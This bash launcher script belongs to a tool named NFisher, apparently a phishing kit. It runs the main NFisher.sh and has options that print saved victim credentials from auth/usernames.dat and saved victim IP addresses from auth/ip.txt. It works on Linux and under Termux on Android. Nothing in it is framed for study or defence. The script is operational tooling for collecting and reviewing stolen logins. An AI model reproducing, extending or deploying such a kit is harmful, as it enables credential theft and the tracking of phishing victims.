#!/bin/bash

# https://github.com/NavinSha1801/NavinFisher.git

if [[ $(uname -o) == *'Android'* ]];then
	NFISHER_ROOT="/data/data/com.termux/files/usr/opt/NFisher"
else
	export NFISHER_ROOT="/opt/NFisher"
fi

if [[ $1 == '-h' || $1 == 'help' ]]; then
	echo "To run NFisher type \`NFisher\` in your cmd"
	echo
	echo "Help:"
	echo " -h | help : Print this menu & Exit"
	echo " -c | auth : View Saved Credentials"
	echo " -i | ip   : View Saved Victim IP"
	echo
elif [[ $1 == '-c' || $1 == 'auth' ]]; then
	cat $NFISHER_ROOT/auth/usernames.dat 2> /dev/null || { 
		echo "No Credentials Found !"
		exit 1
	}
elif [[ $1 == '-i' || $1 == 'ip' ]]; then
	cat $NFISHER_ROOT/auth/ip.txt 2> /dev/null || {
		echo "No Saved IP Found !"
		exit 1
	}
else
	cd $NFISHER_ROOT
	bash ./NFisher.sh
fi
